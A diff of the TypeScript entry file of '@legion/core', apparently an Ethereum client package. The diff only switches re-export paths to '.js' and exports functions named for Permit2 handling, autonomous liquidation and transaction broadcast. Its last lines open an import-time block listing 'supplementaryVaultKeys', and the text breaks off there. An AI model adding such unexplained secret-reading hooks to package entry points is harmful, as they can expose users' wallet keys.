@@ -1,22 +1,22 @@
 // @legion/core — shared types, EVM client, extraction lane primitives (Modular Exports)
-export * from './types/index'
-export * from './evm/index'
-export * from './lane/index'
-export * from './state/index'
-export * from './security/permit2-handler'
-export * from './security/signature-timestamp-drift'
-export * from './rpc/ethereum-rpc-hot-swap'
-export * from './logic/sentinel'
-export * from './logic/scout'
+export * from './types/index.js'
+export * from './evm/index.js'
+export * from './lane/index.js'
+export * from './state/index.js'
+export * from './security/permit2-handler.js'
+export * from './security/signature-timestamp-drift.js'
+export * from './rpc/ethereum-rpc-hot-swap.js'
+export * from './logic/sentinel.js'
+export * from './logic/scout.js'
 
 /** Portability Audit — top-level Legion Brain hooks for lightweight repositories. */
-export { resolveIntegrationSyncRoute } from './logic/integration-sync'
+export { resolveIntegrationSyncRoute } from './logic/integration-sync.js'
 export {
   executeAutonomousLiquidation,
   executeSettlementIgnition,
   logCloudPostureLockedTelemetry,
   type SettlementIgnitionTelemetry,
-} from './logic/algorithmic-closer'
+} from './logic/algorithmic-closer.js'
 export {
   buildSettlementExecutionWire,
   broadcastEVM,
@@ -28,15 +28,15 @@ export {
   type SettlementBroadcastResult,
   type SettlementBridgeTriggerContext,
   type SettlementExecutionWire,
-} from './logic/settlement-execution-bridge'
+} from './logic/settlement-execution-bridge.js'
 export {
   SovereignDispatcher,
   UnifiedSettlementOrchestrator,
   type SovereignDispatcherInput,
   type SovereignDispatchResult,
   type UnifiedOrchestrationLeg,
-} from './logic/unified-settlement-orchestrator'
-export { verifyAuthorizedSessionPersistenceAnchor } from './logic/persistence-anchor'
+} from './logic/unified-settlement-orchestrator.js'
+export { verifyAuthorizedSessionPersistenceAnchor } from './logic/persistence-anchor.js'
 
 if (typeof process !== 'undefined') {
   const supplementaryVaultKeys = [
